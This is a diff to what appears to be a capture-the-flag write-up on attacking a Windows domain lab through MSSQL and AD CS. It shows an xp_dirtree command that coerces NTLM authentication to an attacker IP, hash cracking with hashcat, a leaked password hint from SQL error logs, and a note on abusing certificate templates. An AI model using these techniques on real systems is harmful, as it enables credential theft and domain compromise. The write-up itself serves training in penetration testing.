@@ -350,6 +350,14 @@ EXEC master..xp_dirtree '\\10.10.14.49\escape\', 1, 1;
 hashcat -m 5600 hash.txt rockyou.txt
 ```
 
+### SQL Server Error Logs Analysis
+
+**Evidence of failed SQL Server authentication attempts:**
+
+![SQL Server ERRORLOG with password hints](image-3.png)
+
+The ERRORLOG reveals failed login attempts with credential hints visible in error messages. Log entries show database upgrade steps and authentication failures for users like `sequel\Ryan.Cooper` and `NuclearMosquito3` references, providing initial credentials for the domain user.
+
 **Output:**
 ```
 hashcat (v7.1.2-382-g2d71af371) starting
@@ -381,6 +389,21 @@ Optimizers applied:
 ---
 
 ## Active Directory Certificate Services (AD CS) Enumeration
+
+### AD CS Architecture Overview
+
+**How AD CS Request Flow Works:**
+
+![AD CS Architecture and Certificate Request Flow](image-4.png)
+
+The diagram illustrates the complete certificate request lifecycle:
+1. **User** authenticates to **Enterprise CA** through Active Directory
+2. **User** requests certificate using a specific **Certificate Template**
+3. **Enterprise CA** validates user permissions against the template and AD
+4. **Certificate Template** defines enrollment permissions and subject name policy
+5. **Enterprise CA** generates and issues certificate to user
+
+**Attack Surface:** Vulnerable templates allow users to request certificates for arbitrary principals (other users, machines, or Domain Admin accounts).
 
 ### Certipy Installation
 
